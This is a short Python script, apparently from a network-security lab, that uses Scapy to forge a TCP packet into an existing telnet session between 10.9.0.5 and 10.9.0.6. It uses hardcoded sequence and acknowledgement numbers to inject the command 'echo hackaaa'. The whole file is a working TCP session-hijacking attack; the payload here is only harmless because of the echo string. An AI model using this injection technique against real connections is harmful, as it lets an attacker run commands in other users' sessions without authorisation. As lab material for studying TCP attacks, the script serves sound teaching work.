from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits

ip=IP(src='10.9.0.5',dst='10.9.0.6')
tcp=TCP(sport=43386,dport=23,flags='A',seq=1725633516,ack=1288303463)
data='echo hackaaa\n\0'
pkt=ip/tcp/data
ls(pkt)
send(pkt, verbose = 0)
	
